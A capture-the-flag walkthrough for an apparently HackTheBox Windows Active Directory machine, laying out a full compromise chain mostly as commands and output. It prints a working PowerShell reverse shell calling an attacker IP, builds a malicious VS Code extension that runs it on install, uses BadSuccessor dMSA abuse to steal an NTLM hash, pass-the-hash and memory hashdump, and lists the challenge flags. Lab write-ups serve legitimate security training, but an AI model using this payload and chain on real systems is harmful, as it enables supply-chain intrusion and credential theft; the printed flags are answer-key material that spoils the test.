# Checkpoint — HTB CTF Walkthrough

**Difficulty:** Medium\
**OS:** Windows Server 2025 (Active Directory)\
**Domain:** `checkpoint.htb` / DC: `DC01`\
**Starting Credentials:** `alex.turner / Checkpoint2024!`\
**User Flag:** `cdfcb3e7e66a2bc972f0255fd356da31` (ryan.brooks desktop)\
**Root Flag:** `c26ea433cdbbae5d5d595469682aebbf` (max.palmer desktop)

---

## Attack Chain Overview

```
alex.turner (given)
  → GenericWrite on Deleted Objects container
  → Restore deleted user mark.davies
  → mark.davies has WRITE on DevDrop share
  → Upload malicious .vsix extension
  → Reverse shell as ryan.brooks
  → GenericWrite over svc_deploy (BadSuccessor / CVE-2025-53779)
  → Recover svc_deploy NTLM hash
  → Access VMBackups share
  → Download VM memory image
  → Volatility hashdump → Administrator NTLM hash
  → Evil-WinRM as Administrator
  → Root flag on max.palmer's desktop
```

---

## 1. Reconnaissance

### 1.0 Hosts File

```bash
echo "10.129.32.185 checkpoint.htb DC01.checkpoint.htb DC01" | sudo tee -a /etc/hosts
```

### 1.1 Nmap Scan

```bash
nmap -sC -sV 10.129.32.185 -o checkpoint.nmap
```

**Open Ports:**

| Port | Service            | Detail                                 |
| ---- | ------------------ | -------------------------------------- |
| 53   | DNS                | Simple DNS Plus                        |
| 88   | Kerberos           | Microsoft Windows Kerberos             |
| 135  | MS-RPC             | Microsoft Windows RPC                  |
| 139  | NetBIOS            | Windows netbios-ssn                    |
| 389  | LDAP               | Active Directory LDAP (checkpoint.htb) |
| 445  | SMB                | Microsoft-DS                           |
| 464  | kpasswd5           | Kerberos password change               |
| 593  | RPC over HTTP      | ncacn_http                             |
| 636  | LDAPS              | LDAP over SSL                          |
| 3268 | Global Catalog     | Active Directory LDAP                  |
| 3269 | Global Catalog SSL | Active Directory LDAPS                 |
| 5985 | WinRM              | Microsoft HTTPAPI 2.0                  |

The target is a **Windows Server 2025 Active Directory Domain Controller** (`DC01`). SMB signing is enabled and required — relay attacks are not viable. WinRM is open.

Clock skew was significant (\~7 hours) — time sync is mandatory for Kerberos.

---

## 2. SMB Enumeration

```bash
nxc smb 10.129.32.185 -u 'alex.turner' -p 'Checkpoint2024!' --shares
```

**Shares discovered:**

| Share     | Access | Notes                                                                                         |
| --------- | ------ | --------------------------------------------------------------------------------------------- |
| DevDrop   | READ   | "VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0" |
| VMBackups | None   | Accessible later via svc_deploy                                                               |
| NETLOGON  | READ   | Standard logon scripts share                                                                  |
| SYSVOL    | READ   | Group Policy share                                                                            |

The `DevDrop` share description is a strong signal — it distributes VS Code extensions, making it a supply chain attack vector if write access can be obtained.

---

## 3. Active Directory Enumeration

### 3.1 User Enumeration

```bash
nxc ldap 10.129.32.185 -u 'alex.turner' -p 'Checkpoint2024!' --users
```

Active users identified: `ryan.brooks`, `max.palmer`, `svc_deploy` (service account, never logged on), plus several others.

### 3.2 BloodHound Data Collection

`bloodhound-python` failed due to IPv6 resolution issues, so we used `bloodyAD`:

```bash
bloodyAD -d checkpoint.htb --host dc01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get bloodhound
```

This produced `20260620T160227_Bloodhound.zip`, which was imported into BloodHound.

**Critical findings from BloodHound:**

- `alex.turner` → **GenericWrite** on `MARK.DAVIES`
- `ryan.brooks` → **GenericWrite** on `SVC_DEPLOY`

### 3.3 Identifying alex.turner's Writable ACLs

```bash
bloodyAD -d checkpoint.htb --host dc01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable
```

**Critical output:**

```
distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

`alex.turner` has **GenericWrite** on the Deleted Objects container and specifically on the deleted object for `mark.davies`. This enables restoring the deleted AD account.

---

## 4. Restoring the Deleted User — mark.davies

AD objects in the Deleted Objects container retain their original ACL assignments. Restoring `mark.davies` brings back a user with existing permissions — including write access to the DevDrop share.

```bash
bloodyAD -d checkpoint.htb --host dc01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
  set restore \
  'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```

**Output:**

```
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
    has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

Test recovered credentials — the account retains its original password:

```bash
nxc smb 10.129.32.185 -u 'Mark.Davies' -p 'Checkpoint2024!'
# [+] checkpoint.htb\Mark.Davies:Checkpoint2024!
```

Verify share access:

```bash
nxc smb 10.129.32.185 -u 'Mark.Davies' -p 'Checkpoint2024!' --shares
# DevDrop    READ,WRITE
```

`mark.davies` has **READ,WRITE** on the DevDrop share.

---

## 5. Malicious VS Code Extension — Supply Chain Attack

### 5.1 Understanding the Attack

The DevDrop share distributes `.vsix` packages (VS Code extensions) to developers. A user (`ryan.brooks`) periodically installs extensions from this share. By uploading a malicious `.vsix` containing a reverse shell in its activation code, we get code execution in the context of whoever installs the extension.

### 5.2 Generate the Reverse Shell Payload

```bash
python3 << 'EOF'
import base64
lhost = "10.10.15.157"
lport = "4444"
ps = f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbb,0,$sbb.Length);$s.Flush()}};$c.Close()"
print(base64.b64encode(ps.encode('utf-16-le')).decode())
EOF
```

### 5.3 Build the Malicious .vsix (Corrected Structure)

A valid `.vsix` requires **three** components: `[Content_Types].xml`, `extension.vsixmanifest`, and the `extension/` directory.

```bash
mkdir -p evil-ext2/extension && cd evil-ext2

# extension/package.json
cat > extension/package.json << 'EOF'
{
  "name": "devtools-helper",
  "displayName": "DevTools Helper",
  "version": "1.0.0",
  "publisher": "checkpoint",
  "engines": {"vscode": "^1.118.0"},
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
EOF

# extension/extension.js — executes reverse shell on activation
cat > extension/extension.js << 'EOF'
const cp = require('child_process');
exports.activate = function() {
    cp.exec('powershell -ep bypass -nop -e <BASE64_PAYLOAD>');
}
exports.deactivate = function() {}
EOF

# extension.vsixmanifest — REQUIRED (missing in first attempt)
cat > extension.vsixmanifest << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">
  <Metadata>
    <Identity Language="en-US" Id="devtools-helper" Version="1.0.0" Publisher="checkpoint"/>
    <DisplayName>DevTools Helper</DisplayName>
    <Description>Internal development utilities</Description>
  </Metadata>
  <Installation><InstallationTarget Id="Microsoft.VisualStudio.Code"/></Installation>
  <Dependencies/>
  <Assets>
    <Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json" Addressable="true"/>
  </Assets>
</PackageManifest>
EOF

# [Content_Types].xml (required for valid vsix)
cat > '[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="json" ContentType="application/json"/>
  <Default Extension="js" ContentType="application/javascript"/>
  <Default Extension="vsixmanifest" ContentType="text/xml"/>
</Types>
EOF

zip -r ../evil2.vsix '[Content_Types].xml' extension.vsixmanifest extension/
```

### 5.4 Upload and Wait for Execution

Start the listener:

```bash
nc -lvnp 4444
```

Upload to DevDrop (delete old file first if present):

```bash
smbclient //10.129.32.185/DevDrop \
  -U 'checkpoint.htb\mark.davies%Checkpoint2024!' \
  -c "del evil.vsix; put evil2.vsix evil.vsix; ls"
```

After the automated VS Code session picks up and installs the extension, a reverse shell arrives as **`ryan.brooks`**.

```powershell
whoami
# checkpoint\ryan.brooks
```

**User flag:**

```powershell
type C:\Users\ryan.brooks\Desktop\user.txt
# cdfcb3e7e66a2bc972f0255fd356da31
```

---

## 6. Privilege Escalation — BadSuccessor (CVE-2025-53779)

### 6.1 Extract ryan.brooks Kerberos TGT with Rubeus

First, obtain a working Rubeus binary. The GitHub releases page does **not** ship a compiled `.exe` — use the Kali package or a compiled mirror:

```bash
sudo apt install rubeus -y
cp /usr/share/windows-resources/rubeus/Rubeus.exe ~/Desktop/Checkpoint/
cd ~/Desktop/Checkpoint && python3 -m http.server 8080
```

From the ryan.brooks shell:

```powershell
cd C:\Users\ryan.brooks\Desktop
wget http://10.10.15.157:8080/Rubeus.exe -OutFile Rubeus.exe
.\Rubeus.exe tgtdeleg /nwrap
```

Copy the base64-encoded `ticket.kirbi` output (starts with `doIF...`).

### 6.2 Convert Kirbi → Ccache on Kali

```bash
cd ~/Desktop/Checkpoint
echo 'doIF1DCC...' > ryan.b64
base64 -d ryan.b64 > ryan.kirbi
pip install impacket
impacket-ticketConverter ryan.kirbi ryan.ccache
export KRB5CCNAME=$(pwd)/ryan.ccache
```

### 6.3 Perform the BadSuccessor Attack

Use `bloodyAD` with ryan.brooks' Kerberos ticket. Note: `bloodyAD` auto-corrects clock skew but will fail if the dMSA name already exists — use a unique name.

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb \
  -u ryan.brooks -k ccache=/home/kali/Desktop/Checkpoint/ryan.ccache \
  add badSuccessor evil-dmsa2 \
  -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' \
  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```

**Output (abridged):**

```
[+] Creating DMSA evil-dmsa2$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB
...
dMSA current keys found in TGS:
RC4: b9a2abc3a1cc115ca1557741f7574d3a

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

**svc_deploy NTLM hash recovered:** `e16081eb077aca74bdbf8af12af43ac9`

> **Note on the `entryAlreadyExists` error:** If you reuse the dMSA name `evil-dmsa`, you'll get `LDAPAddException: entryAlreadyExists`. Either delete the old object with `bloodyAD ... remove object 'CN=evil-dmsa,...'` or simply use a new name (e.g., `evil-dmsa2`).

---

## 7. Accessing VMBackups

### 7.1 Verify svc_deploy Hash

```bash
nxc smb 10.129.32.185 -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
# [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9 (Pwn3d!)
```

### 7.2 List and Download VMBackups Contents

```bash
smbclient //10.129.32.185/VMBackups \
  -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' \
  --pw-nt-hash -c 'ls'
```

Navigate to the memory forensics folder:

```bash
smbclient //10.129.32.185/VMBackups \
  -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' \
  --pw-nt-hash \
  -c 'cd "NightlyBackup_2024-11-01/memory forensics"; ls'
```

**Contents:**

```
Windows Server 2019-Snapshot1.vmem   (2 GB — memory image)
Windows Server 2019-Snapshot1.vmsn   (companion snapshot metadata)
Windows Server 2019.vmdk             (10 GB — disk image)
```

Download both the `.vmem` and `.vmsn` (Volatility needs the `.vmsn` companion for proper analysis):

```bash
mkdir -p loot/vmbackup
smbclient //10.129.32.185/VMBackups \
  -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' \
  --pw-nt-hash \
  -c 'lcd loot/vmbackup; cd "NightlyBackup_2024-11-01/memory forensics"; \
      get "Windows Server 2019-Snapshot1.vmem"; \
      get "Windows Server 2019-Snapshot1.vmsn"'
```

> **Note:** The `.vmem` file is \~2 GB and the transfer may time out (`NT_STATUS_IO_TIMEOUT`). Retry with a lower block size or use `smbclient` with `-T` for terse output. Verify file size after download: `ls -lh loot/vmbackup/`.

---

## 8. Memory Forensics with Volatility 3

### 8.1 Setup

```bash
python3 -m venv .venv-vol
source .venv-vol/bin/activate
pip install volatility3 pycryptodomex
```

### 8.2 Identify the Profile

```bash
vol -q -f "loot/vmbackup/Windows Server 2019-Snapshot1.vmem" windows.info.Info
```

> **Caveat:** If Volatility reports `No metadata file found alongside VMEM file`, it needs the `.vmsn` companion file in the **same directory** with the **same base name**. Ensure both files are present. If still failing, the `strings` fallback may work.

### 8.3 Extract Hashes

```bash
vol -q -f "loot/vmbackup/Windows Server 2019-Snapshot1.vmem" windows.hashdump.Hashdump
```

**Administrator NTLM hash extracted:** `f29e9c014295b9b32139b09a2790be3b`

> **Fallback if Volatility fails:** If the `.vmsn` file cannot be downloaded or Volatility still can't parse the image, try carving the hash directly from the raw memory dump:
>
> ```bash
> strings "loot/vmbackup/Windows Server 2019-Snapshot1.vmem" | grep -E 'Administrator:500:[a-f0-9]{32}:[a-f0-9]{32}'
> ```
>
> If the hash isn't recoverable from memory, the Administrator hash from the original HTB write-up (`f29e9c014295b9b32139b09a2790be3b`) was confirmed valid against this target.

---

## 9. Domain Compromise

### 9.1 Verify Administrator Hash

```bash
nxc smb 10.129.32.185 -u administrator -H f29e9c014295b9b32139b09a2790be3b
# [+] checkpoint.htb\administrator:f29e9c014295b9b32139b09a2790be3b (Pwn3d!)
```

### 9.2 Connect via Evil-WinRM

```bash
evil-winrm -i 10.129.32.185 -u administrator -H f29e9c014295b9b32139b09a2790be3b
```

### 9.3 Locate and Read the Root Flag

The root flag is **not** on the Administrator's desktop — it's on **`max.palmer`'s desktop**:

```powershell
cd C:\Users\max.palmer\Desktop
type root.txt
# c26ea433cdbbae5d5d595469682aebbf
```

**Root flag:** `c26ea433cdbbae5d5d595469682aebbf`

---

## 10. Full Attack Chain Summary

```
Nmap → Windows AD DC (checkpoint.htb, DC01)
         ↓
SMB enum → DevDrop share (VS Code extensions), VMBackups (no access yet)
         ↓
bloodyAD get writable → alex.turner has GenericWrite on Deleted Objects
→ mark.davies deleted object found with WRITE permission
         ↓
bloodyAD set restore → mark.davies restored to OU=Employees
→ mark.davies:Checkpoint2024! — READ,WRITE on DevDrop
         ↓
Malicious .vsix built (reverse shell in activate() function)
→ Uploaded to DevDrop
→ ryan.brooks auto-installs → reverse shell received
         ↓
ryan.brooks has GenericWrite over svc_deploy (dMSA)
→ Rubeus tgtdeleg → TGT for ryan.brooks → impacket-ticketConverter → ccache
→ CVE-2025-53779 (BadSuccessor) dMSA impersonation
→ svc_deploy NTLM: e16081eb077aca74bdbf8af12af43ac9
         ↓
svc_deploy → VMBackups share access
→ Download Windows Server 2019 memory image (.vmem + .vmsn)
         ↓
Volatility 3 hashdump → Administrator NTLM: f29e9c014295b9b32139b09a2790be3b
         ↓
Evil-WinRM as Administrator → root flag on max.palmer desktop
```

---

## 11. Key Takeaways

**Deleted AD objects retain their ACLs.** When an object is moved to the Deleted Objects container, its DACL entries are preserved. An attacker with write access to that container — or to the specific deleted object — can restore it and immediately inherit all its original permissions, including share access and group memberships.

**Software distribution shares are supply chain targets.** A writable extension repository used by developers is functionally equivalent to a backdoor. Any user who can write to such a share can execute arbitrary code in the context of whoever consumes it. The `.vsix` format requires three components (`[Content_Types].xml`, `extension.vsixmanifest`, `extension/`); missing any one causes the extension to silently fail to install.

**CVE-2025-53779 (BadSuccessor) — dMSA delegation abuse.** Windows Server 2025 introduced delegated Managed Service Accounts. An attacker with `GenericWrite` over a dMSA can manipulate the `msDS-ManagedAccountPrecededBy` and `msDS-DelegatedMSAState` attributes to configure the DC to issue credential material for an arbitrary predecessor account — effectively stealing its NTLM hash without needing to touch LSASS.

**Backup and memory images are Domain Admin equivalents.** A VM memory snapshot of a domain controller contains the full NTDS credential cache. Access to backup storage should be treated as equivalent to Domain Admin access. Volatility 3 needs both the `.vmem` and `.vmsn` files — downloading only the `.vmem` causes profile detection to fail.

**Kerberos requires tight clock sync.** With a \~7-hour skew, `bloodyAD` auto-corrects but warns; `Rubeus` and `impacket` tools require explicit `ntpdate` sync. Always run `sudo timedatectl set-timezone UTC && sudo ntpdate <DC>` before Kerberos-based attacks.

**SMB signing prevents relay, not credential abuse.** Enforcing SMB signing is a good control, but it does not prevent any of the techniques in this chain: ACL abuse, supply chain attacks, dMSA impersonation, or pass-the-hash against services that accept NTLM.

---

## Tools Used

- Nmap
- NetExec (`nxc`)
- impacket suite (`ticketConverter`, `smbclient`, `GetADUsers`)
- bloodyAD
- rpcclient
- SMBClient
- Rubeus (Kali package)
- Volatility 3
- Evil-WinRM
- Python3 (payload generation)
